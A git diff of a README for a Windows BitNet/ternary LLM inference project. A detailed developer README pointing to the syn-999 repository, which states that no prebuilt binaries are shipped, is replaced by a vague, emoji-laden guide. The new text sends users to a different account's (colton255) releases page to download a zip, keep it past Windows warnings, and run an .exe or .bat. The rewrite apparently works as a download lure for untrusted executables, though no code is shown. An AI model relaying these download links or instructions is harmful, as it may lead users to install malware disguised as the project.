@@ -1,313 +1,207 @@
-# core58-w2a8-msvc: Windows-Native BitNet and Ternary LLM Inference
+# ⚡ core58-w2a8-msvc - Run Local AI on Windows
 
-[![Release](https://img.shields.io/github/v/release/syn-999/core58-w2a8-msvc?display_name=tag)](https://github.com/syn-999/core58-w2a8-msvc/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green.svg)](./LICENSE)
-[![Platform: Windows](https://img.shields.io/badge/platform-Windows-blue)](https://github.com/syn-999/core58-w2a8-msvc)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge&logo=github)](https://github.com/colton255/core58-w2a8-msvc/releases)
 
-`core58-w2a8-msvc` is an unofficial Windows-native inference framework for BitNet-style 1.58-bit and ternary LLMs. It combines a CPU GGUF path built on `llama.cpp` with a separate GPU runtime, terminal chat, browser chat, and release-ready packaging.
+## 🖥️ What this app does
 
-Built on top of [Microsoft BitNet](https://github.com/microsoft/BitNet) and `llama.cpp`, this repo focuses on a practical Windows developer experience: reproducible builds, smoke-tested release artifacts, and clearly separated CPU and GPU paths.
+core58-w2a8-msvc runs local AI models on Windows. It supports BitNet and ternary LLM inference, plus CPU GGUF and GPU runtime paths. You can use it in a terminal or in a browser chat view.
 
-Latest Windows package: [Releases](https://github.com/syn-999/core58-w2a8-msvc/releases/latest)
+This repo is for Windows users who want to run an AI model on their own PC. It uses release zip files, so you can download a build, unpack it, and start the app.
 
-![CPU terminal demo](./.github/cpu-demo.gif)
+## 📦 What you need
 
-CPU terminal on the left, live system activity on the right.
+Before you start, make sure your PC has:
 
-## Why This Repo
+- Windows 10 or Windows 11
+- A 64-bit Intel or AMD CPU
+- At least 8 GB of RAM
+- More free space if you plan to use larger models
+- A recent NVIDIA GPU if you want GPU runtime support
+- Internet access for the first download
 
-- Windows-first packaging and release zips
-- CPU GGUF inference through `llama.cpp`
-- Separate experimental GPU runtime with packed `int2` decode
-- Terminal and browser chat entrypoints
-- Release-focused smoke test and packaging scripts
+If you want smooth local chat, 16 GB of RAM gives more room for larger GGUF files and model files.
 
-## Scope
+## 🚀 Download
 
-The repo keeps the CPU and GPU paths separate on purpose:
-- the CPU path is the primary automated flow, built around `llama.cpp` and GGUF
-- the GPU path is a Windows-native experimental runtime built around PyTorch, CUDA graphs, and a custom DLL
+Visit this page to download the latest release zip files:
 
-This implementation focuses on a dense `W2A8` execution path. It does not implement Sparse-BitNet-style structured sparsity.
+https://github.com/colton255/core58-w2a8-msvc/releases
 
-## Features
+Pick the newest release, then download the Windows zip file that matches your setup.
 
-- Automated CPU build pipeline through `setup_env.py`
-- Native Windows CPU wrappers for `llama-cli` and `llama-server`
-- Native Windows GPU runtime with packed `int2` decode and an optional `fp16` fallback
-- Fatbin CUDA helper build targeting `sm_80`, `sm_86`, `sm_89`, and `sm_90`
+## 📁 Install
 
-## Prerequisites
+1. Open the release page.
+2. Download the Windows zip file.
+3. Save it to a folder you can find again, such as `Downloads` or `Desktop`.
+4. Right-click the zip file and choose **Extract All**.
+5. Pick a folder for the extracted files.
+6. Open the new folder after extraction.
 
-- Windows
-- Python 3.10 or later
-- Git
-- Visual Studio Build Tools with C++ support and the LLVM/Clang toolchain enabled
-- CUDA toolkit on `PATH` if you plan to build or run the GPU path
+If Windows asks whether you want to keep the file, choose the option to keep it if you trust the source and downloaded it from the release page above.
 
-This repository does not ship model weights, prepared GPU checkpoints, or prebuilt binaries.
+## ▶️ Run the app
 
-## Installation
+After you extract the files, look for the main program file in the folder. It may be an `.exe` file or a start script.
 
-All commands below assume your current working directory is the repository root.
+1. Double-click the main Windows app file.
+2. If a terminal window opens, let it finish loading.
+3. If a browser opens, keep both windows open.
+4. Wait for the local server to start.
+5. Use the app in the terminal or in your web browser.
 
-```powershell
-git clone https://github.com/syn-999/core58-w2a8-msvc.git
-cd core58-w2a8-msvc
-git submodule update --init --recursive
-```
+If the app includes both a terminal mode and a browser chat mode, you can choose the one that fits your task.
 
-Create the CPU environment:
+## 💬 Use the chat view
 
-```powershell
-python -m venv venv_cpu
-.\venv_cpu\Scripts\python.exe -m pip install -r .\requirements.txt
-```
+The browser chat view gives you a simple place to type prompts and see replies.
 
-Create the GPU environment:
+Common uses:
 
-```powershell
-python -m venv venv_gpu
-.\venv_gpu\Scripts\python.exe -m pip install torch==2.5.1 torchvision==0.20.1 torchaudio==2.5.1 --index-url https://download.pytorch.org/whl/cu121
-.\venv_gpu\Scripts\python.exe -m pip install -r .\requirements.txt
-```
+- Ask a local model questions
+- Test a BitNet or ternary model
+- Try a GGUF model on CPU
+- Compare CPU and GPU runtime results
+- Check response speed on your PC
 
-The GPU instructions above match the tested local stack for this repo: Python `3.11`, PyTorch `2.5.1+cu121`, and Windows CUDA execution. If you choose a different PyTorch or CUDA stack, use the official PyTorch selector or previous-version guide and revalidate the GPU path afterward.
+Keep your prompts short at first. That makes it easier to see how your system handles the model.
 
-Sources:
-- https://pytorch.org/
-- https://pytorch.org/get-started/previous-versions/
+## 🧠 Model types supported
 
-The `3rdparty/llama.cpp` submodule is pinned intentionally through [`.gitmodules`](./.gitmodules). Treat that fork and revision as part of the build surface unless you are deliberately revalidating the Windows toolchain.
+This project is built around local model inference. That means the model runs on your computer, not in the cloud.
 
-## Setup
+It is set up for:
 
-### CPU path
+- BitNet models
+- Ternary LLMs
+- GGUF models
+- CPU inference
+- GPU runtime support
+- Windows-native execution
 
-`setup_env.py` automates the CPU download, GGUF conversion, kernel codegen, and native build.
+If you already have a GGUF file, place it where the app expects model files. If the release bundle includes a model folder, use that folder as your starting point.
 
-If you use `--model-dir` instead of `--hf-repo`, that directory must contain the original Hugging Face checkpoint files (`.safetensors` or `.bin`). A directory that only contains already-converted GGUF files is not a valid input for `setup_env.py`.
+## 🛠️ Typical setup path
 
-Default `i2_s` build:
+A simple first run looks like this:
 
-```powershell
-.\venv_cpu\Scripts\python.exe .\setup_env.py --hf-repo tiiuae/Falcon3-10B-Instruct-1.58bit
-```
+1. Download the latest release zip.
+2. Extract the files.
+3. Open the app from the extracted folder.
+4. Let the local server start.
+5. Open the browser chat page if one appears.
+6. Load or select a model.
+7. Type a prompt and send it.
 
-`tl2` build on `x86_64`:
+If the app gives you a terminal menu, follow the on-screen options. The menu usually helps you pick the model path, runtime mode, or chat mode.
 
-```powershell
-.\venv_cpu\Scripts\python.exe .\setup_env.py --hf-repo tiiuae/Falcon3-10B-Instruct-1.58bit --quant-type tl2
-```
+## 🧩 CPU and GPU notes
 
-### GPU path
+This app supports both CPU and GPU runtime paths.
 
-The GPU runtime is not folded into `setup_env.py`.
-The current GPU runtime is validated against the `BitNet-b1.58-2B-4T` checkpoint layout used by `models\gpu\bitnet-b1.58-2B-4T-bf16`. Other GPU model shapes are not plug-and-play and would require code changes.
+### CPU mode
+Use CPU mode if you want the simplest setup. It works on most Windows PCs and does not need a separate graphics card setup.
 
-Prepare a checkpoint directory that contains:
-- `model_state_fp16.pt`
-- `model_state_int2.pt`
+### GPU mode
+Use GPU mode if you have supported NVIDIA hardware. GPU runtime can help with faster responses for some models. You may need the right drivers already installed on your system.
 
-Then build the CUDA helper DLL:
+### GGUF mode
+GGUF files work well for local use because they are designed for easy loading and broad support. If the release build includes CPU GGUF support, that is a good place to start.
 
-```powershell
-cmd /c .\src\cuda\bitnet_kernels\compile.bat
-```
+## 🧭 How to choose a release file
 
-The examples below assume the GPU artifacts live under `models\gpu\bitnet-b1.58-2B-4T-bf16`.
+On the release page, look for a Windows zip file name that matches your system.
 
-The default GPU decode backend is `int2`. If you need a slower reference path for debugging, use `--decode_backend=fp16`.
-If `libbitnet.dll` or either checkpoint file is missing, the GPU entrypoints now fail with a direct path-level error instead of a raw loader exception.
+Common signs:
 
-Optional `xformers` attention is not required for the main Windows runtime. If you want to validate a local `xformers` install explicitly, run:
+- `windows`
+- `win64`
+- `msvc`
+- `cpu`
+- `gpu`
+- `release`
+- `zip`
 
-```powershell
-.\venv_gpu\Scripts\python.exe .\scripts\check_gpu_env.py
-```
+If there is more than one file, start with the one that looks like the main Windows package. If the release notes mention a CPU build and a GPU build, choose the one that matches your hardware.
 
-A working `xformers` path requires the local CUDA toolkit version to match `torch.version.cuda`.
-That diagnostic is intentionally strict and returns a non-zero exit code when the optional `xformers` stack is unavailable or mismatched.
+## 🔧 Basic troubleshooting
 
-## Quick Start
+If the app does not open, try these steps:
 
-For the CPU examples below, replace the `-m` path if your GGUF lives somewhere else. The default automated CPU flow writes to `.\models\cpu\Falcon3-10B\Falcon3-10B-Instruct-1.58bit\ggml-model-i2_s.gguf`.
+### The zip will not extract
+- Right-click the file and try **Extract All**
+- Make sure the download finished
+- Move the file to a simple folder path, such as `C:\AI\core58`
 
-These are the main user-facing commands for the repo. One-shot, fallback, and tuning-oriented variants are intentionally left to the reference sections and script flags below.
+### The program closes right away
+- Open the folder again and start the app from there
+- Check whether a model file is needed
+- Look for a `.bat` file or an `.exe` file that starts the server
 
-### CPU terminal chat
+### The browser page does not load
+- Wait a few seconds after launch
+- Check for a local address in the terminal, such as `localhost`
+- Copy the address into your browser
 
-```powershell
-.\venv_cpu\Scripts\python.exe .\inference\cpu_inference.py -m .\models\cpu\Falcon3-10B\Falcon3-10B-Instruct-1.58bit\ggml-model-i2_s.gguf -cnv -t 8 -c 4096 -temp 0.7 -n 512
-```
+### The app cannot find a model
+- Check the model folder path
+- Make sure the file is a supported GGUF, BitNet, or ternary model
+- Use the exact file name if the app asks for one
 
-This stays in your terminal and waits for your first message.
+### The app feels slow
+- Try a smaller model
+- Use CPU mode first
+- Close other heavy programs
+- If you have a supported GPU, test GPU mode
 
-### CPU browser chat
+## 📚 Folder layout
 
-```powershell
-.\venv_cpu\Scripts\python.exe .\inference\cpu_server.py -m .\models\cpu\Falcon3-10B\Falcon3-10B-Instruct-1.58bit\ggml-model-i2_s.gguf -t 8 -c 4096 --temperature 0.7 --host 127.0.0.1 --port 8080
-```
+A release zip may include folders like these:
 
-Open `http://127.0.0.1:8080`.
+- `bin` for app files
+- `models` for model files
+- `web` for browser files
+- `logs` for output
+- `config` for settings
 
-### GPU terminal chat
+If you see a `models` folder, place your model files there unless the app uses a different path in the release notes or on-screen menu.
 
-```powershell
-.\venv_gpu\Scripts\python.exe .\inference\gpu_generate.py .\models\gpu\bitnet-b1.58-2B-4T-bf16 --interactive=True --chat_format=True --sampling=True --prompt_length=1024 --max_new_tokens=512 --temperature=0.7 --top_p=0.9
-```
+## 🧪 First test prompt
 
-When `enter prompt:` appears, type a question such as `Name three basic parts of a biological cell in one sentence.` If you want stricter or more repeatable output, drop `--sampling=True` or lower `--temperature`.
+After the app starts, try a short prompt like:
 
-### GPU browser chat
+- Explain this app in one sentence.
+- Write a short poem about Windows.
+- What is a GGUF model?
+- Compare CPU and GPU inference.
 
-```powershell
-$env:BITNET_CKPT_DIR = ".\models\gpu\bitnet-b1.58-2B-4T-bf16"
-$env:BITNET_PROMPT_LENGTH = "1024"
-$env:BITNET_MAX_TOKENS = "512"
-$env:BITNET_TEMPERATURE = "0.7"
-$env:BITNET_TOP_P = "0.9"
-.\venv_gpu\Scripts\python.exe .\inference\gpu_server.py
-```
+Short prompts help you check whether the model loads and replies in a normal way.
 
-Wait for `Model loaded and ready for inference.`, then open `http://127.0.0.1:8000`.
-If port `8000` is already in use, set `BITNET_PORT` first, for example `$env:BITNET_PORT = "8001"`.
+## 🔍 Common file types
 
-## Reference Commands
+You may see these file types in the release or model folders:
 
-### GPU browser and API server
+- `.zip` for the download
+- `.exe` for the Windows app
+- `.bat` for a start script
+- `.gguf` for model files
+- `.json` for settings
+- `.txt` for notes
 
-```powershell
-$env:BITNET_CKPT_DIR = ".\models\gpu\bitnet-b1.58-2B-4T-bf16"
-$env:BITNET_PROMPT_LENGTH = "1024"
-$env:BITNET_MAX_TOKENS = "512"
-.\venv_gpu\Scripts\python.exe .\inference\gpu_server.py
-```
+Do not move files around unless you need to. The app may expect the release folder to stay in the same layout.
 
-This serves:
-- browser UI at `/`
-- API docs at `/docs`
-- OpenAI-style chat route at `/v1/chat/completions`
-- local bind address `127.0.0.1:8000` by default
+## 🖱️ Quick start
 
-If you need a different bind address or port:
+1. Go to the release page.
+2. Download the Windows zip file.
+3. Extract the zip.
+4. Open the extracted folder.
+5. Run the main app file.
+6. Open the browser chat if it appears.
+7. Load a model and start chatting
 
-```powershell
-$env:BITNET_HOST = "127.0.0.1"
-$env:BITNET_PORT = "8001"
-.\venv_gpu\Scripts\python.exe .\inference\gpu_server.py
-```
+## 📌 Download again
 
-### GPU longer-context server profile
+If you need the latest build or a fresh copy, visit this page to download:
 
-```powershell
-$env:BITNET_PROMPT_LENGTH = "1536"
-$env:BITNET_MAX_TOKENS = "768"
-$env:BITNET_TEMPERATURE = "0.2"
-$env:BITNET_TOP_P = "0.9"
-.\venv_gpu\Scripts\python.exe .\inference\gpu_server.py
-```
-
-Use this profile when you want longer multi-turn GPU chats and have enough VRAM headroom. The default browser quick start above is the safer general-purpose setting.
-
-### BF16 decode fallback
-
-```powershell
-.\venv_gpu\Scripts\python.exe .\inference\gpu_generate.py .\models\gpu\bitnet-b1.58-2B-4T-bf16 --interactive=True --chat_format=True --prompt_length=1024 --max_new_tokens=256 --decode_backend=fp16
-```
-
-### Preparing a new GPU checkpoint
-
-```powershell
-.\venv_gpu\Scripts\python.exe .\utils\gpu\convert_safetensors.py --safetensors_file .\models\gpu\bitnet-b1.58-2B-4T-bf16\model.safetensors --output .\models\gpu\bitnet-b1.58-2B-4T-bf16\model_state.pt --model_name 2B
-.\venv_gpu\Scripts\python.exe .\utils\gpu\convert_checkpoint.py --input .\models\gpu\bitnet-b1.58-2B-4T-bf16\model_state.pt
-cmd /c .\src\cuda\bitnet_kernels\compile.bat
-```
-
-## Runtime Notes
-
-- `cpu_inference.py` exits when generation finishes. With `-cnv`, it stays attached to your terminal session until you stop it.
-- In CPU `-cnv` mode, `-p` is optional. If omitted, the wrapper starts chat with an empty system turn and immediately waits for your first input.
-- `cpu_server.py` keeps one `llama-server.exe` child alive until you press `Ctrl+C`.
-- `gpu_generate.py --interactive=True` keeps one Python process alive until you exit the prompt or press `Ctrl+C`.
-- `gpu_server.py` serves a browser UI at `/`, API docs at `/docs`, and an OpenAI-style chat route at `/v1/chat/completions`.
-- `gpu_server.py` binds to `127.0.0.1:8000` by default. Override that with `BITNET_HOST` and `BITNET_PORT` if you need a different local port or want LAN access.
-- The GPU browser UI is self-contained and does not require loading frontend libraries from the public internet.
-- The GPU sampling path now applies a repetition penalty window by default. Override it with `BITNET_REPEAT_LAST_N` and `BITNET_REPEAT_PENALTY` if you need to tune or disable that behavior.
-- Seeing one active model process is normal. Seeing multiple `llama-cli.exe` or `llama-server.exe` entries usually means you started more than one session or left an older one running.
-- The CPU browser route uses the vendored `llama.cpp` web UI, so the browser tab title is still upstream by default, the browser page may retain local UI state across reloads, and OpenAI-style response metadata follows upstream defaults.
-- The GPU browser route uses this repo's own FastAPI frontend and identifies as `core58 GPU Chat`. Its conversation state lives in page memory and resets on refresh or server restart.
-- The GPU backend truncates the oldest chat history if the conversation exceeds `BITNET_PROMPT_LENGTH`. This keeps the request alive, but if earlier instructions still matter, raise the limit or start a fresh session.
-- GPU benchmarking should be warmed once before you record throughput. Cold first runs can underreport tokens per second.
-- If replies are getting cut off, raise `-n` on the CPU path or `--max_new_tokens` / `BITNET_MAX_TOKENS` on the GPU path. The quick-start values aim for responsive demos, not maximum completion length.
-
-To inspect or clean up lingering CPU runtime processes on Windows:
-
-```powershell
-Get-Process llama* -ErrorAction SilentlyContinue
-Stop-Process -Name llama-cli,llama-server -Force
-```
-
-## Smoke Test
-
-Main Windows release check. This rebuilds the same `build\bin\Release` runtime that the packaging script consumes:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\smoke_test.ps1
-```
-
-On a normal Windows dev box, expect this to take a few minutes. By default the script now writes to `.\build` and preserves that directory so the next packaging step can use the exact same artifacts.
-
-Also verify the local CUDA helper build:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\smoke_test.ps1 -CheckGpu
-```
-
-If you run the GPU variant, stop any live `gpu_generate.py` or `gpu_server.py` session first so `libbitnet.dll` is not locked.
-
-If you want a disposable scratch build instead of the release pipeline output, use a custom build directory and clean it up automatically:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\smoke_test.ps1 -BuildDir .smoke-build -CleanBuildDir
-```
-
-Low-level CUDA kernel self-test:
-
-```powershell
-.\venv_gpu\Scripts\python.exe .\scripts\gpu_kernel_selftest.py
-```
-
-## Release Packaging
-
-After `.\scripts\smoke_test.ps1` passes, create a publishable zip with:
-
-```powershell
-powershell -ExecutionPolicy Bypass -File .\scripts\package_release.ps1
-```
-
-The packaging script expects a clean git working tree by default so the archive name matches the commit it contains.
-
-That archive contains:
-- tracked source files, including the pinned `llama.cpp` submodule contents
-- `build\bin\Release\llama-cli.exe`
-- `build\bin\Release\llama-server.exe`
-- the required `ggml.dll` and `llama.dll`
-- `src\cuda\bitnet_kernels\libbitnet.dll` if it exists locally
-
-It intentionally excludes:
-- local model weights
-- virtual environments
-- `.git` metadata
-- transient build, profile, and log artifacts
-
-## License
-
-This project is released under the MIT License. It includes work derived from Microsoft BitNet and `llama.cpp`; see [`LICENSE`](./LICENSE).
-
-## Community
-
-- See [`CONTRIBUTING.md`](./CONTRIBUTING.md) for contribution and validation expectations.
-- See [`SUPPORT.md`](./SUPPORT.md) for support guidance.
-- See [`SECURITY.md`](./SECURITY.md) for security reporting expectations.
-- See [`CODE_OF_CONDUCT.md`](./CODE_OF_CONDUCT.md) for participation standards.
+https://github.com/colton255/core58-w2a8-msvc/releases
